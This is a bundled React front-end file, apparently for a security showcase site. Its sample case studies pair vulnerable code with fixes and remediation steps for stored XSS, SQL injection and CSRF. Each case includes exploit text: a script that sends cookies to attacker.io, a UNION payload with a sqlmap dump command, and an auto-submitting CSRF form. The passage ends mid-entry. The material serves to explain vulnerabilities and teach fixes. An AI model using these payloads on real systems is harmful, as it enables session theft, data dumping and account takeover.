import { c as createLucideIcon, j as jsxRuntimeExports, e as cn, r as reactExports, R as Root$1, C as Content$1, f as Close, X, T as Title, P as Portal, O as Overlay, h as createContextScope, o, u as useComposedRefs, k as createSlot, l as useId, m as Primitive, n as composeEventHandlers, p as useControllableState, q as useCallbackRef, s as Presence, S as Shield, B as Button, E as ExternalLink } from "./index-C_2TD7nS.js";
import { S as SectionHeader, G as GlassCard } from "./SectionHeader-C5mfMumD.js";
import { T as Terminal, B as Badge } from "./badge-7Bfpkyxf.js";
import { m as motion } from "./proxy-K7n5D9Td.js";
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const __iconNode$2 = [["path", { d: "M20 6 9 17l-5-5", key: "1gmf2c" }]];
const Check = createLucideIcon("check", __iconNode$2);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const __iconNode$1 = [
  ["rect", { width: "14", height: "14", x: "8", y: "8", rx: "2", ry: "2", key: "17jyea" }],
  ["path", { d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2", key: "zix9uf" }]
];
const Copy = createLucideIcon("copy", __iconNode$1);
/**
 * @license lucide-react v0.511.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const __iconNode = [
  ["rect", { width: "18", height: "18", x: "3", y: "3", rx: "2", ry: "2", key: "1m3agn" }],
  ["circle", { cx: "9", cy: "9", r: "2", key: "af1f0g" }],
  ["path", { d: "m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21", key: "1xmnt7" }]
];
const Image = createLucideIcon("image", __iconNode);
const severityStyles = {
  Critical: "bg-destructive/20 text-destructive border-destructive/50 shadow-[0_0_8px_oklch(var(--destructive)/0.4)]",
  High: "bg-orange-500/20 text-orange-400 border-orange-500/50 shadow-[0_0_8px_rgba(249,115,22,0.3)]",
  Medium: "bg-yellow-500/20 text-yellow-400 border-yellow-500/50 shadow-[0_0_8px_rgba(234,179,8,0.3)]",
  Low: "bg-primary/20 text-primary border-primary/50 shadow-[0_0_8px_oklch(var(--primary)/0.3)]"
};
const statusStyles = {
  Fixed: "bg-primary/20 text-primary border-primary/50 shadow-[0_0_8px_oklch(var(--primary)/0.4)]",
  InProgress: "bg-accent/20 text-accent border-accent/50 shadow-[0_0_8px_oklch(var(--accent)/0.3)]"
};
function NeonBadge({
  label,
  variant = "category",
  severity,
  status,
  className
}) {
  let styles = "bg-muted/50 text-muted-foreground border-border/50";
  if (variant === "severity" && severity) {
    styles = severityStyles[severity];
  } else if (variant === "status" && status) {
    styles = statusStyles[status];
  } else if (variant === "category") {
    styles = "bg-accent/10 text-accent border-accent/40";
  }
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    "span",
    {
      className: cn(
        "inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium border transition-smooth",
        styles,
        className
      ),
      children: label
    }
  );
}
function TerminalBlock({
  code,
  label,
  variant = "default",
  className
}) {
  const [copied, setCopied] = reactExports.useState(false);
  const handleCopy = async () => {
    await navigator.clipboard.writeText(code);
    setCopied(true);
    setTimeout(() => setCopied(false), 2e3);
  };
  const headerColor = {
    default: "bg-muted/50 border-border/50",
    attack: "bg-destructive/10 border-destructive/30",
    fix: "bg-primary/10 border-primary/30"
  }[variant];
  const borderColor = {
    default: "border-border/40",
    attack: "border-destructive/30",
    fix: "border-primary/30"
  }[variant];
  const dotColors = {
    default: ["bg-red-500", "bg-yellow-500", "bg-green-500"],
    attack: ["bg-destructive/80", "bg-destructive/50", "bg-destructive/30"],
    fix: ["bg-primary/80", "bg-primary/50", "bg-primary/30"]
  }[variant];
  return /* @__PURE__ */ jsxRuntimeExports.jsxs(
    "div",
    {
      className: cn(
        "rounded-lg overflow-hidden border font-mono text-sm",
        borderColor,
        className
      ),
      children: [
        /* @__PURE__ */ jsxRuntimeExports.jsxs(
          "div",
          {
            className: cn(
              "flex items-center justify-between px-4 py-2 border-b",
              headerColor,
              borderColor
            ),
            children: [
              /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-3", children: [
                /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "flex gap-1.5", children: dotColors.map((dot) => /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: cn("w-3 h-3 rounded-full", dot) }, dot)) }),
                /* @__PURE__ */ jsxRuntimeExports.jsxs("div", { className: "flex items-center gap-1.5 text-muted-foreground text-xs", children: [
                  /* @__PURE__ */ jsxRuntimeExports.jsx(Terminal, { className: "w-3 h-3" }),
                  /* @__PURE__ */ jsxRuntimeExports.jsx("span", { children: label ?? "terminal" })
                ] })
              ] }),
              /* @__PURE__ */ jsxRuntimeExports.jsx(
                "button",
                {
                  type: "button",
                  onClick: handleCopy,
                  className: "text-muted-foreground hover:text-foreground transition-colors p-1 rounded",
                  "aria-label": "Copy code",
                  children: copied ? /* @__PURE__ */ jsxRuntimeExports.jsx(Check, { className: "w-3.5 h-3.5 text-primary" }) : /* @__PURE__ */ jsxRuntimeExports.jsx(Copy, { className: "w-3.5 h-3.5" })
                }
              )
            ]
          }
        ),
        /* @__PURE__ */ jsxRuntimeExports.jsx("div", { className: "p-4 bg-background/80 overflow-x-auto", children: /* @__PURE__ */ jsxRuntimeExports.jsx(
          "pre",
          {
            className: cn(
              "text-xs leading-relaxed whitespace-pre",
              variant === "attack" && "text-destructive/90",
              variant === "fix" && "text-primary/90",
              variant === "default" && "text-foreground/80"
            ),
            children: /* @__PURE__ */ jsxRuntimeExports.jsx("code", { children: code })
          }
        ) })
      ]
    }
  );
}
function Dialog({
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(Root$1, { "data-slot": "dialog", ...props });
}
function DialogPortal({
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(Portal, { "data-slot": "dialog-portal", ...props });
}
function DialogOverlay({
  className,
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    Overlay,
    {
      "data-slot": "dialog-overlay",
      className: cn(
        "data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 fixed inset-0 z-50 bg-black/50",
        className
      ),
      ...props
    }
  );
}
function DialogContent({
  className,
  children,
  showCloseButton = true,
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsxs(DialogPortal, { "data-slot": "dialog-portal", children: [
    /* @__PURE__ */ jsxRuntimeExports.jsx(DialogOverlay, {}),
    /* @__PURE__ */ jsxRuntimeExports.jsxs(
      Content$1,
      {
        "data-slot": "dialog-content",
        className: cn(
          "bg-background data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 fixed top-[50%] left-[50%] z-50 grid w-full max-w-[calc(100%-2rem)] translate-x-[-50%] translate-y-[-50%] gap-4 rounded-lg border p-6 shadow-lg duration-200 sm:max-w-lg",
          className
        ),
        ...props,
        children: [
          children,
          showCloseButton && /* @__PURE__ */ jsxRuntimeExports.jsxs(
            Close,
            {
              "data-slot": "dialog-close",
              className: "ring-offset-background focus:ring-ring data-[state=open]:bg-accent data-[state=open]:text-muted-foreground absolute top-4 right-4 rounded-xs opacity-70 transition-opacity hover:opacity-100 focus:ring-2 focus:ring-offset-2 focus:outline-hidden disabled:pointer-events-none [&_svg]:pointer-events-none [&_svg]:shrink-0 [&_svg:not([class*='size-'])]:size-4",
              children: [
                /* @__PURE__ */ jsxRuntimeExports.jsx(X, {}),
                /* @__PURE__ */ jsxRuntimeExports.jsx("span", { className: "sr-only", children: "Close" })
              ]
            }
          )
        ]
      }
    )
  ] });
}
function DialogHeader({ className, ...props }) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    "div",
    {
      "data-slot": "dialog-header",
      className: cn("flex flex-col gap-2 text-center sm:text-left", className),
      ...props
    }
  );
}
function DialogTitle({
  className,
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    Title,
    {
      "data-slot": "dialog-title",
      className: cn("text-lg leading-none font-semibold", className),
      ...props
    }
  );
}
function createCollection(name) {
  const PROVIDER_NAME = name + "CollectionProvider";
  const [createCollectionContext, createCollectionScope2] = createContextScope(PROVIDER_NAME);
  const [CollectionProviderImpl, useCollectionContext] = createCollectionContext(
    PROVIDER_NAME,
    { collectionRef: { current: null }, itemMap: /* @__PURE__ */ new Map() }
  );
  const CollectionProvider = (props) => {
    const { scope, children } = props;
    const ref = o.useRef(null);
    const itemMap = o.useRef(/* @__PURE__ */ new Map()).current;
    return /* @__PURE__ */ jsxRuntimeExports.jsx(CollectionProviderImpl, { scope, itemMap, collectionRef: ref, children });
  };
  CollectionProvider.displayName = PROVIDER_NAME;
  const COLLECTION_SLOT_NAME = name + "CollectionSlot";
  const CollectionSlotImpl = createSlot(COLLECTION_SLOT_NAME);
  const CollectionSlot = o.forwardRef(
    (props, forwardedRef) => {
      const { scope, children } = props;
      const context = useCollectionContext(COLLECTION_SLOT_NAME, scope);
      const composedRefs = useComposedRefs(forwardedRef, context.collectionRef);
      return /* @__PURE__ */ jsxRuntimeExports.jsx(CollectionSlotImpl, { ref: composedRefs, children });
    }
  );
  CollectionSlot.displayName = COLLECTION_SLOT_NAME;
  const ITEM_SLOT_NAME = name + "CollectionItemSlot";
  const ITEM_DATA_ATTR = "data-radix-collection-item";
  const CollectionItemSlotImpl = createSlot(ITEM_SLOT_NAME);
  const CollectionItemSlot = o.forwardRef(
    (props, forwardedRef) => {
      const { scope, children, ...itemData } = props;
      const ref = o.useRef(null);
      const composedRefs = useComposedRefs(forwardedRef, ref);
      const context = useCollectionContext(ITEM_SLOT_NAME, scope);
      o.useEffect(() => {
        context.itemMap.set(ref, { ref, ...itemData });
        return () => void context.itemMap.delete(ref);
      });
      return /* @__PURE__ */ jsxRuntimeExports.jsx(CollectionItemSlotImpl, { ...{ [ITEM_DATA_ATTR]: "" }, ref: composedRefs, children });
    }
  );
  CollectionItemSlot.displayName = ITEM_SLOT_NAME;
  function useCollection2(scope) {
    const context = useCollectionContext(name + "CollectionConsumer", scope);
    const getItems = o.useCallback(() => {
      const collectionNode = context.collectionRef.current;
      if (!collectionNode) return [];
      const orderedNodes = Array.from(collectionNode.querySelectorAll(`[${ITEM_DATA_ATTR}]`));
      const items = Array.from(context.itemMap.values());
      const orderedItems = items.sort(
        (a, b) => orderedNodes.indexOf(a.ref.current) - orderedNodes.indexOf(b.ref.current)
      );
      return orderedItems;
    }, [context.collectionRef, context.itemMap]);
    return getItems;
  }
  return [
    { Provider: CollectionProvider, Slot: CollectionSlot, ItemSlot: CollectionItemSlot },
    useCollection2,
    createCollectionScope2
  ];
}
var DirectionContext = reactExports.createContext(void 0);
function useDirection(localDir) {
  const globalDir = reactExports.useContext(DirectionContext);
  return localDir || globalDir || "ltr";
}
var ENTRY_FOCUS = "rovingFocusGroup.onEntryFocus";
var EVENT_OPTIONS = { bubbles: false, cancelable: true };
var GROUP_NAME = "RovingFocusGroup";
var [Collection, useCollection, createCollectionScope] = createCollection(GROUP_NAME);
var [createRovingFocusGroupContext, createRovingFocusGroupScope] = createContextScope(
  GROUP_NAME,
  [createCollectionScope]
);
var [RovingFocusProvider, useRovingFocusContext] = createRovingFocusGroupContext(GROUP_NAME);
var RovingFocusGroup = reactExports.forwardRef(
  (props, forwardedRef) => {
    return /* @__PURE__ */ jsxRuntimeExports.jsx(Collection.Provider, { scope: props.__scopeRovingFocusGroup, children: /* @__PURE__ */ jsxRuntimeExports.jsx(Collection.Slot, { scope: props.__scopeRovingFocusGroup, children: /* @__PURE__ */ jsxRuntimeExports.jsx(RovingFocusGroupImpl, { ...props, ref: forwardedRef }) }) });
  }
);
RovingFocusGroup.displayName = GROUP_NAME;
var RovingFocusGroupImpl = reactExports.forwardRef((props, forwardedRef) => {
  const {
    __scopeRovingFocusGroup,
    orientation,
    loop = false,
    dir,
    currentTabStopId: currentTabStopIdProp,
    defaultCurrentTabStopId,
    onCurrentTabStopIdChange,
    onEntryFocus,
    preventScrollOnEntryFocus = false,
    ...groupProps
  } = props;
  const ref = reactExports.useRef(null);
  const composedRefs = useComposedRefs(forwardedRef, ref);
  const direction = useDirection(dir);
  const [currentTabStopId, setCurrentTabStopId] = useControllableState({
    prop: currentTabStopIdProp,
    defaultProp: defaultCurrentTabStopId ?? null,
    onChange: onCurrentTabStopIdChange,
    caller: GROUP_NAME
  });
  const [isTabbingBackOut, setIsTabbingBackOut] = reactExports.useState(false);
  const handleEntryFocus = useCallbackRef(onEntryFocus);
  const getItems = useCollection(__scopeRovingFocusGroup);
  const isClickFocusRef = reactExports.useRef(false);
  const [focusableItemsCount, setFocusableItemsCount] = reactExports.useState(0);
  reactExports.useEffect(() => {
    const node = ref.current;
    if (node) {
      node.addEventListener(ENTRY_FOCUS, handleEntryFocus);
      return () => node.removeEventListener(ENTRY_FOCUS, handleEntryFocus);
    }
  }, [handleEntryFocus]);
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    RovingFocusProvider,
    {
      scope: __scopeRovingFocusGroup,
      orientation,
      dir: direction,
      loop,
      currentTabStopId,
      onItemFocus: reactExports.useCallback(
        (tabStopId) => setCurrentTabStopId(tabStopId),
        [setCurrentTabStopId]
      ),
      onItemShiftTab: reactExports.useCallback(() => setIsTabbingBackOut(true), []),
      onFocusableItemAdd: reactExports.useCallback(
        () => setFocusableItemsCount((prevCount) => prevCount + 1),
        []
      ),
      onFocusableItemRemove: reactExports.useCallback(
        () => setFocusableItemsCount((prevCount) => prevCount - 1),
        []
      ),
      children: /* @__PURE__ */ jsxRuntimeExports.jsx(
        Primitive.div,
        {
          tabIndex: isTabbingBackOut || focusableItemsCount === 0 ? -1 : 0,
          "data-orientation": orientation,
          ...groupProps,
          ref: composedRefs,
          style: { outline: "none", ...props.style },
          onMouseDown: composeEventHandlers(props.onMouseDown, () => {
            isClickFocusRef.current = true;
          }),
          onFocus: composeEventHandlers(props.onFocus, (event) => {
            const isKeyboardFocus = !isClickFocusRef.current;
            if (event.target === event.currentTarget && isKeyboardFocus && !isTabbingBackOut) {
              const entryFocusEvent = new CustomEvent(ENTRY_FOCUS, EVENT_OPTIONS);
              event.currentTarget.dispatchEvent(entryFocusEvent);
              if (!entryFocusEvent.defaultPrevented) {
                const items = getItems().filter((item) => item.focusable);
                const activeItem = items.find((item) => item.active);
                const currentItem = items.find((item) => item.id === currentTabStopId);
                const candidateItems = [activeItem, currentItem, ...items].filter(
                  Boolean
                );
                const candidateNodes = candidateItems.map((item) => item.ref.current);
                focusFirst(candidateNodes, preventScrollOnEntryFocus);
              }
            }
            isClickFocusRef.current = false;
          }),
          onBlur: composeEventHandlers(props.onBlur, () => setIsTabbingBackOut(false))
        }
      )
    }
  );
});
var ITEM_NAME = "RovingFocusGroupItem";
var RovingFocusGroupItem = reactExports.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeRovingFocusGroup,
      focusable = true,
      active = false,
      tabStopId,
      children,
      ...itemProps
    } = props;
    const autoId = useId();
    const id = tabStopId || autoId;
    const context = useRovingFocusContext(ITEM_NAME, __scopeRovingFocusGroup);
    const isCurrentTabStop = context.currentTabStopId === id;
    const getItems = useCollection(__scopeRovingFocusGroup);
    const { onFocusableItemAdd, onFocusableItemRemove, currentTabStopId } = context;
    reactExports.useEffect(() => {
      if (focusable) {
        onFocusableItemAdd();
        return () => onFocusableItemRemove();
      }
    }, [focusable, onFocusableItemAdd, onFocusableItemRemove]);
    return /* @__PURE__ */ jsxRuntimeExports.jsx(
      Collection.ItemSlot,
      {
        scope: __scopeRovingFocusGroup,
        id,
        focusable,
        active,
        children: /* @__PURE__ */ jsxRuntimeExports.jsx(
          Primitive.span,
          {
            tabIndex: isCurrentTabStop ? 0 : -1,
            "data-orientation": context.orientation,
            ...itemProps,
            ref: forwardedRef,
            onMouseDown: composeEventHandlers(props.onMouseDown, (event) => {
              if (!focusable) event.preventDefault();
              else context.onItemFocus(id);
            }),
            onFocus: composeEventHandlers(props.onFocus, () => context.onItemFocus(id)),
            onKeyDown: composeEventHandlers(props.onKeyDown, (event) => {
              if (event.key === "Tab" && event.shiftKey) {
                context.onItemShiftTab();
                return;
              }
              if (event.target !== event.currentTarget) return;
              const focusIntent = getFocusIntent(event, context.orientation, context.dir);
              if (focusIntent !== void 0) {
                if (event.metaKey || event.ctrlKey || event.altKey || event.shiftKey) return;
                event.preventDefault();
                const items = getItems().filter((item) => item.focusable);
                let candidateNodes = items.map((item) => item.ref.current);
                if (focusIntent === "last") candidateNodes.reverse();
                else if (focusIntent === "prev" || focusIntent === "next") {
                  if (focusIntent === "prev") candidateNodes.reverse();
                  const currentIndex = candidateNodes.indexOf(event.currentTarget);
                  candidateNodes = context.loop ? wrapArray(candidateNodes, currentIndex + 1) : candidateNodes.slice(currentIndex + 1);
                }
                setTimeout(() => focusFirst(candidateNodes));
              }
            }),
            children: typeof children === "function" ? children({ isCurrentTabStop, hasTabStop: currentTabStopId != null }) : children
          }
        )
      }
    );
  }
);
RovingFocusGroupItem.displayName = ITEM_NAME;
var MAP_KEY_TO_FOCUS_INTENT = {
  ArrowLeft: "prev",
  ArrowUp: "prev",
  ArrowRight: "next",
  ArrowDown: "next",
  PageUp: "first",
  Home: "first",
  PageDown: "last",
  End: "last"
};
function getDirectionAwareKey(key, dir) {
  if (dir !== "rtl") return key;
  return key === "ArrowLeft" ? "ArrowRight" : key === "ArrowRight" ? "ArrowLeft" : key;
}
function getFocusIntent(event, orientation, dir) {
  const key = getDirectionAwareKey(event.key, dir);
  if (orientation === "vertical" && ["ArrowLeft", "ArrowRight"].includes(key)) return void 0;
  if (orientation === "horizontal" && ["ArrowUp", "ArrowDown"].includes(key)) return void 0;
  return MAP_KEY_TO_FOCUS_INTENT[key];
}
function focusFirst(candidates, preventScroll = false) {
  const PREVIOUSLY_FOCUSED_ELEMENT = document.activeElement;
  for (const candidate of candidates) {
    if (candidate === PREVIOUSLY_FOCUSED_ELEMENT) return;
    candidate.focus({ preventScroll });
    if (document.activeElement !== PREVIOUSLY_FOCUSED_ELEMENT) return;
  }
}
function wrapArray(array, startIndex) {
  return array.map((_, index) => array[(startIndex + index) % array.length]);
}
var Root = RovingFocusGroup;
var Item = RovingFocusGroupItem;
var TABS_NAME = "Tabs";
var [createTabsContext] = createContextScope(TABS_NAME, [
  createRovingFocusGroupScope
]);
var useRovingFocusGroupScope = createRovingFocusGroupScope();
var [TabsProvider, useTabsContext] = createTabsContext(TABS_NAME);
var Tabs$1 = reactExports.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeTabs,
      value: valueProp,
      onValueChange,
      defaultValue,
      orientation = "horizontal",
      dir,
      activationMode = "automatic",
      ...tabsProps
    } = props;
    const direction = useDirection(dir);
    const [value, setValue] = useControllableState({
      prop: valueProp,
      onChange: onValueChange,
      defaultProp: defaultValue ?? "",
      caller: TABS_NAME
    });
    return /* @__PURE__ */ jsxRuntimeExports.jsx(
      TabsProvider,
      {
        scope: __scopeTabs,
        baseId: useId(),
        value,
        onValueChange: setValue,
        orientation,
        dir: direction,
        activationMode,
        children: /* @__PURE__ */ jsxRuntimeExports.jsx(
          Primitive.div,
          {
            dir: direction,
            "data-orientation": orientation,
            ...tabsProps,
            ref: forwardedRef
          }
        )
      }
    );
  }
);
Tabs$1.displayName = TABS_NAME;
var TAB_LIST_NAME = "TabsList";
var TabsList$1 = reactExports.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTabs, loop = true, ...listProps } = props;
    const context = useTabsContext(TAB_LIST_NAME, __scopeTabs);
    const rovingFocusGroupScope = useRovingFocusGroupScope(__scopeTabs);
    return /* @__PURE__ */ jsxRuntimeExports.jsx(
      Root,
      {
        asChild: true,
        ...rovingFocusGroupScope,
        orientation: context.orientation,
        dir: context.dir,
        loop,
        children: /* @__PURE__ */ jsxRuntimeExports.jsx(
          Primitive.div,
          {
            role: "tablist",
            "aria-orientation": context.orientation,
            ...listProps,
            ref: forwardedRef
          }
        )
      }
    );
  }
);
TabsList$1.displayName = TAB_LIST_NAME;
var TRIGGER_NAME = "TabsTrigger";
var TabsTrigger$1 = reactExports.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTabs, value, disabled = false, ...triggerProps } = props;
    const context = useTabsContext(TRIGGER_NAME, __scopeTabs);
    const rovingFocusGroupScope = useRovingFocusGroupScope(__scopeTabs);
    const triggerId = makeTriggerId(context.baseId, value);
    const contentId = makeContentId(context.baseId, value);
    const isSelected = value === context.value;
    return /* @__PURE__ */ jsxRuntimeExports.jsx(
      Item,
      {
        asChild: true,
        ...rovingFocusGroupScope,
        focusable: !disabled,
        active: isSelected,
        children: /* @__PURE__ */ jsxRuntimeExports.jsx(
          Primitive.button,
          {
            type: "button",
            role: "tab",
            "aria-selected": isSelected,
            "aria-controls": contentId,
            "data-state": isSelected ? "active" : "inactive",
            "data-disabled": disabled ? "" : void 0,
            disabled,
            id: triggerId,
            ...triggerProps,
            ref: forwardedRef,
            onMouseDown: composeEventHandlers(props.onMouseDown, (event) => {
              if (!disabled && event.button === 0 && event.ctrlKey === false) {
                context.onValueChange(value);
              } else {
                event.preventDefault();
              }
            }),
            onKeyDown: composeEventHandlers(props.onKeyDown, (event) => {
              if ([" ", "Enter"].includes(event.key)) context.onValueChange(value);
            }),
            onFocus: composeEventHandlers(props.onFocus, () => {
              const isAutomaticActivation = context.activationMode !== "manual";
              if (!isSelected && !disabled && isAutomaticActivation) {
                context.onValueChange(value);
              }
            })
          }
        )
      }
    );
  }
);
TabsTrigger$1.displayName = TRIGGER_NAME;
var CONTENT_NAME = "TabsContent";
var TabsContent$1 = reactExports.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTabs, value, forceMount, children, ...contentProps } = props;
    const context = useTabsContext(CONTENT_NAME, __scopeTabs);
    const triggerId = makeTriggerId(context.baseId, value);
    const contentId = makeContentId(context.baseId, value);
    const isSelected = value === context.value;
    const isMountAnimationPreventedRef = reactExports.useRef(isSelected);
    reactExports.useEffect(() => {
      const rAF = requestAnimationFrame(() => isMountAnimationPreventedRef.current = false);
      return () => cancelAnimationFrame(rAF);
    }, []);
    return /* @__PURE__ */ jsxRuntimeExports.jsx(Presence, { present: forceMount || isSelected, children: ({ present }) => /* @__PURE__ */ jsxRuntimeExports.jsx(
      Primitive.div,
      {
        "data-state": isSelected ? "active" : "inactive",
        "data-orientation": context.orientation,
        role: "tabpanel",
        "aria-labelledby": triggerId,
        hidden: !present,
        id: contentId,
        tabIndex: 0,
        ...contentProps,
        ref: forwardedRef,
        style: {
          ...props.style,
          animationDuration: isMountAnimationPreventedRef.current ? "0s" : void 0
        },
        children: present && children
      }
    ) });
  }
);
TabsContent$1.displayName = CONTENT_NAME;
function makeTriggerId(baseId, value) {
  return `${baseId}-trigger-${value}`;
}
function makeContentId(baseId, value) {
  return `${baseId}-content-${value}`;
}
var Root2 = Tabs$1;
var List = TabsList$1;
var Trigger = TabsTrigger$1;
var Content = TabsContent$1;
function Tabs({
  className,
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    Root2,
    {
      "data-slot": "tabs",
      className: cn("flex flex-col gap-2", className),
      ...props
    }
  );
}
function TabsList({
  className,
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    List,
    {
      "data-slot": "tabs-list",
      className: cn(
        "bg-muted text-muted-foreground inline-flex h-9 w-fit items-center justify-center rounded-lg p-[3px]",
        className
      ),
      ...props
    }
  );
}
function TabsTrigger({
  className,
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    Trigger,
    {
      "data-slot": "tabs-trigger",
      className: cn(
        "data-[state=active]:bg-background dark:data-[state=active]:text-foreground focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:outline-ring dark:data-[state=active]:border-input dark:data-[state=active]:bg-input/30 text-foreground dark:text-muted-foreground inline-flex h-[calc(100%-1px)] flex-1 items-center justify-center gap-1.5 rounded-md border border-transparent px-2 py-1 text-sm font-medium whitespace-nowrap transition-[color,box-shadow] focus-visible:ring-[3px] focus-visible:outline-1 disabled:pointer-events-none disabled:opacity-50 data-[state=active]:shadow-sm [&_svg]:pointer-events-none [&_svg]:shrink-0 [&_svg:not([class*='size-'])]:size-4",
        className
      ),
      ...props
    }
  );
}
function TabsContent({
  className,
  ...props
}) {
  return /* @__PURE__ */ jsxRuntimeExports.jsx(
    Content,
    {
      "data-slot": "tabs-content",
      className: cn("flex-1 outline-none", className),
      ...props
    }
  );
}
const SAMPLE_PROJECTS = [
  {
    id: 1,
    target: "E-Commerce Platform",
    vulnType: "XSS",
    severity: "Critical",
    description: "Stored Cross-Site Scripting vulnerability discovered in the product review system. Attacker-controlled script tags were persisted to the database and executed in the context of any user who viewed the product listing, enabling session hijacking and credential theft at scale.",
    beforeCode: `// Vulnerable: user input rendered directly
app.post('/review', (req, res) => {
  const comment = req.body.comment; // unsanitized
  db.query(\`INSERT INTO reviews (body) VALUES ('\${comment}')\`);
  res.json({ success: true });
});

// React component rendering raw HTML
<div dangerouslySetInnerHTML={{ __html: review.body }} />`,
    afterCode: `// Fixed: DOMPurify + parameterized query
import DOMPurify from 'dompurify';

app.post('/review', (req, res) => {
  const clean = DOMPurify.sanitize(req.body.comment);
  db.query('INSERT INTO reviews (body) VALUES (?)', [clean]);
  res.json({ success: true });
});

// React component using safe text rendering
<p className="review-body">{review.body}</p>`,
    exploitCode: `# Stored XSS — E-Commerce Platform
$ curl -X POST https://target.shop/api/review \\
  -H "Content-Type: application/json" \\
  -d '{"productId":42,"comment":"<script>fetch(\\"https://attacker.io/steal?c=\\"+ document.cookie)<\/script>"}'

HTTP/1.1 200 OK
{"success":true,"id":1337}

# Payload stored. Any visitor to /product/42 triggers:
# => document.cookie exfiltrated to attacker.io
# => Session token: eyJhbGciOiJIUzI1NiJ9...
# => Account takeover confirmed on 3 admin sessions`,
    remediationSteps: [
      "Sanitize all user input with DOMPurify before storage",
      "Replace dangerouslySetInnerHTML with safe text rendering",
      "Use parameterized queries to prevent secondary injection",
      "Implement a strict Content Security Policy (CSP) header",
      "Add output encoding at every rendering layer",
      "Audit all existing reviews and purge malicious entries"
    ],
    cvssScore: "9.3"
  },
  {
    id: 2,
    target: "Banking API",
    vulnType: "SQLi",
    severity: "Critical",
    description: "Classic SQL Injection found in the transaction history endpoint. Unauthenticated attackers could enumerate the entire customer database, extract password hashes, account balances, and PII by manipulating the account_id parameter via UNION-based payloads.",
    beforeCode: `# Vulnerable Python endpoint
@app.route('/transactions')
def get_transactions():
    account_id = request.args.get('account_id')
    # Direct string interpolation — NEVER do this
    query = f"SELECT * FROM transactions WHERE account_id = {account_id}"
    results = db.execute(query).fetchall()
    return jsonify(results)`,
    afterCode: `# Fixed: parameterized query + input validation
from validators import is_valid_account_id

@app.route('/transactions')
@require_auth
def get_transactions():
    account_id = request.args.get('account_id')
    if not is_valid_account_id(account_id):
        abort(400)
    # Parameterized — safe from injection
    results = db.execute(
        "SELECT * FROM transactions WHERE account_id = ?",
        (account_id,)
    ).fetchall()
    return jsonify(results)`,
    exploitCode: `# UNION-based SQL Injection — Banking API
$ curl "https://api.bank.io/transactions?account_id=1 UNION SELECT null,username,password_hash,null FROM users--"

# Response includes:
# {"account_id":null,"amount":"admin","date":"$2b$12$hashed...","ref":null}

# Dump all tables
$ sqlmap -u "https://api.bank.io/transactions?account_id=1" \\
  --dbs --dump --batch --level=5

[*] Databases: banking_prod, audit_logs, admin_panel
[*] Extracted 47,283 customer records
[*] Password hashes cracked: 12,481 (MD5 — weak)`,
    remediationSteps: [
      "Replace all string interpolation with parameterized queries",
      "Validate and whitelist the account_id parameter format",
      "Apply the principle of least privilege to DB user accounts",
      "Enable WAF rules to detect and block SQLi patterns",
      "Rotate all exposed credentials and notify affected users",
      "Upgrade password hashing from MD5 to bcrypt/argon2"
    ],
    cvssScore: "9.8"
  },
  {
    id: 3,
    target: "SaaS Dashboard",
    vulnType: "CSRF",
    severity: "High",
    description: "Cross-Site Request Forgery vulnerability in the account settings API allowed an attacker to trick authenticated users into changing their email address or transferring billing ownership via a malicious external link, with no user awareness.",
    beforeCode: `// Vulnerable: no CSRF token validation
router.post('/settings/email', authenticate, (req, res) => {
  const { newEmail } = req.body;
  // No origin check, no CSRF token
  db.updateUserEmail(req.user.id, newEmail);
  res.json({ success: true });
});`,
    afterCode: `// Fixed: CSRF token + origin validation
import csrf from 'csurf';
const csrfProtection = csrf({ cookie: true });

router.post('/settings/email', authenticate, csrfProtection, (req, res) => {
  const origin = req.headers.origin;
  if (!ALLOWED_ORIGINS.includes(origin)) return res.status(403).end();
  const { newEmail } = req.body;
  db.updateUserEmail(req.user.id, newEmail);
  res.json({ success: true });
});`,
    exploitCode: `<!-- CSRF Attack Page — hosted on attacker.com -->
<html>
  <body onload="document.csrf.submit()">
    <form name="csrf" action="https://app.saas.io/settings/email" method="POST">
      <input type="hidden" name="newEmail" value="attacker@evil.com" />
    </form>
  </body>
</html>

# Victim clicks malicious link while logged in
# => Email changed silently to attacker@evil.com
# => Attacker triggers "Forgot Password" flow
# => Full account takeover in 2 steps`,
    remediationSteps: [
      "Implement synchronizer CSRF tokens on all state-changing endpoints",
      "Validate Origin and Referer headers server-side",
      "Set SameSite=Strict on all session cookies",
      "Use the Double Submit Cookie pattern as a fallback",
      "Add re-authentication for sensitive actions like email change"
    ],
    cvssScore: "8.1"
  },
  {
    id: 4,
    target: "Healthcare Portal",
    vulnType: "Auth Bypass",
    severity: "High",
